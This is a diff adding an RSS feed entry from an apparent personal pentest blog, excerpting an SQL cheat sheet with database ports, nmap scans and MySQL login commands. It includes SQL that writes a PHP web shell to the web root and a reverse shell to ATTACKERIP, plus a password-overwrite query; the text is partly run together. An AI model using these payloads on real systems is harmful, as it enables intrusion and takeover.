@@ -1,0 +1,16 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>SQL - Tag - quactv</title>
+        <link>https://tranquac.github.io/tags/sql/</link>
+        <description>SQL - Tag - quactv</description>
+        <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>tranquac0312@gmail.com (quactv)</managingEditor>
+            <webMaster>tranquac0312@gmail.com (quactv)</webMaster><lastBuildDate>Tue, 08 Jun 2021 18:17:00 &#43;0700</lastBuildDate><atom:link href="https://tranquac.github.io/tags/sql/" rel="self" type="application/rss+xml" /><item>
+    <title>SQL</title>
+    <link>https://tranquac.github.io/posts/sql/</link>
+    <pubDate>Tue, 08 Jun 2021 18:17:00 &#43;0700</pubDate>
+    <author>quactv</author>
+    <guid>https://tranquac.github.io/posts/sql/</guid>
+    <description><![CDATA[General  MySQL (3306) MSSQL (1433) Oracle (1521) PostgresSQL (5432)   SQL Injection  Bad character detect Authen bypass Sql injection bypass filter   SQLMAP Reference  General MySQL-3306 Nmap nmap -Pn -sV -p 3306 --script mysql* TARGETIP Access Remotely: mysql-host=TARGETIP-uroot-pmysql-uroot-ppassword-e&#39;show databases;&#39;mysql-uroot-ppasswordDBNAME-e&#39;select * from TABLENAME;&#39;Access Locally: mysql-uroot-pmysql&gt;useDBNAME;mysql&gt;showtables;Command Backdoor example: SELECT&#34;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&#34;intooutfile&#34;/var/www/html/backdoor.php&#34;;SELECT&#34;&lt;?php exec(&#34;&#34;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/ATTACKERIP/PORT 0&gt;&amp;1&#39;&#34;&#34;); ?&gt; &#34;intooutfile&#34;/tmp/shell.php&#34;;Update a field example: (i.e. change a password): updateTABLENAMEsetPASSWORDFIELD=&#39;NEWHASH&#39;whereUSERNAMEFIELD=&#39;USERNAME&#39;;PHPMyAdmin Default User: root]]></description>
+</item>
+</channel>
+</rss>
